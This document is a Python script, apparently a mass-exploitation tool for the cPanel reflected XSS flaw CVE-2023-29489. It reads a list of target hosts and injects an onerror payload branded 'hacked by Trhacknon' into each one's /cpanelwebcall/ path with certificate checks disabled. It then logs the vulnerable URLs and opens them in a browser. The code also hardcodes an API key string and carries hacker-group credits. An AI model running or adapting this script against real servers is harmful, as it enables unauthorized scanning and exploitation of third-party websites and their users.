import shodan
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import pystyle
from pystyle import *
import webbrowser
import socket
#Coded By Trhacknon
TM_1915 = 'tt2P5vHq83hdJTG69YK9ffdsZLboHqquDd1t'

if platform.system() == 'Windows':
        os.system(
        f'title Exploit XSS CVE-2023-29489  - By Trhacknon'
        )
not_exploit = 0
exploit = 0
error_connect = 0
#Coded By Trhacknon

def logo_start():
    if platform.system() == 'Linux':
      os.system('clear')
    if platform.system() == 'Windows':
      os.system('cls')
    logo = """
                ██╗░░██╗░██████╗░██████╗  ░░███╗░░░█████╗░░░███╗░░███████╗
                ╚██╗██╔╝██╔════╝██╔════╝  ░████║░░██╔══██╗░████║░░██╔════╝
                ░╚███╔╝░╚█████╗░╚█████╗░  ██╔██║░░╚██████║██╔██║░░██████╗░
                ░██╔██╗░░╚═══██╗░╚═══██╗  ╚═╝██║░░░╚═══██║╚═╝██║░░╚════██╗
                ██╔╝╚██╗██████╔╝██████╔╝  ███████╗░█████╔╝███████╗██████╔╝
                ╚═╝░░╚═╝╚═════╝░╚═════╝░  ╚══════╝░╚════╝░╚══════╝╚═════╝░
                        By >> Trhacknon
                                Exploit CVE-2023-29489\r\r
	"""
    Write.Print(f"{logo.replace('░',' ')}",Colors.red,interval=0.0)
    #Coded Trhacknon




def search_cpanel_hosts(api_key):
    #Coded By Trhacknon
    #api = shodan.Shodan(api_key)
    #query = 'cpanel'
    #results = api.search(query)

    #for result in results['matches']:
        #ip_str = result.get('ip_str')
        #host = result.get('http', {}).get('host')
        hosts =  Write.Input("\r\n\n╔═══[ ENTER URL LIST ]\n╚══>>>  ", Colors.red)
        print("\r")
        file_site = open(hosts,'r').read().splitlines()
        for host in file_site:
            host = host.replace("https://","").replace("http://","").replace("/","")
            if host:
                yield host

def test_xss(url):
    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312)">hacked%20by%20Trhacknon"""
    xss_url = urljoin(url, hacked_1312 )
    #Coded By Trhacknon
    # Disable SSL certificate validation
    response = requests.get(xss_url, verify=False)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tags = soup.find_all('img', src='x')
    #Coded By Trhacknon
    for img_tag in img_tags:
        if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1312)":
            return True
    return False

if __name__ == '__main__':
    logo_start()
    for host in search_cpanel_hosts(TM_1915):
        for protocol in ['http', 'https']:
            url = f'{protocol}://{host}'
            #print(f'Checking: {url}')
            ip = socket.gethostbyname(host)
            try:
                #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                if test_xss(url):
                    print(f'\033[35m[+]\033[32m Exploit XSS >>>\033[37m {url} ~ {ip}')
                    exploit +=  1
                    if platform.system() == 'Windows':
                        os.system(
                    f'title Exploit XSS - ({int(exploit)}) Not Exploit - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                    ) #Coded By Trhacknon
                    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312)">hacked%20by%20Trhacknon"""
                    xss_1312 = open("xss_1312.txt","a")
                    xss_1312.write(f"{url}{hacked_1312}\n")
                    xss_1312.close()
                    webbrowser.open(f"{url}{hacked_1312}")
                else: #Coded Trhacknon
                    print(f'\033[35m[+]\033[31m Not Exploit >>>\033[37m {url} ~ {ip}')
                    not_exploit += 1
                    if platform.system() == 'Windows': #Coded By Trhacknon
                        os.system(
                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                    ) #Coded By Trhacknon
            except Exception as e:
                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!') #Coded By Trhacknon
                error_connect += 1
                if platform.system() == 'Windows': #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                        os.system(
                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                    ) #Coded By Trhacknon
